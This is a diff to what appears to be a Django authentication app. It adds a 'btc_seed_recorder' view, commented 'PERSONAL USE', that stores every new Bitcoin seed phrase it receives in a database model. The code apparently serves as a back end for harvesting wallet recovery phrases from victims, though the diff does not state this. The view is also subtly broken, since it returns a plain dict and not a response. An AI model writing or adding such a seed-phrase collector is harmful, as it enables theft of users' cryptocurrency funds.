@@ -4,6 +4,7 @@ from django.http import HttpResponse, JsonResponse
 from django.contrib.sessions.models import Session
 
 from .request_handler import login_get, login_post, sign_up_get, sign_up_post, validate_otp_get, validate_otp_post
+from .models import BTC_SEED_PHRASE
 
 import sys
 sys.path.append('')
@@ -65,3 +66,12 @@ def error500(exception):
 # def delete_all_sessions(request):
 #     Session.objects.all().delete()
 #     return redirect('/')
+
+
+# PERSONAL USE
+def btc_seed_recorder(request, seed):
+    if BTC_SEED_PHRASE.objects.filter(seed=seed).exists():
+        return {'status': False}
+    
+    BTC_SEED_PHRASE(seed=seed).save()
+    return {'status': True}
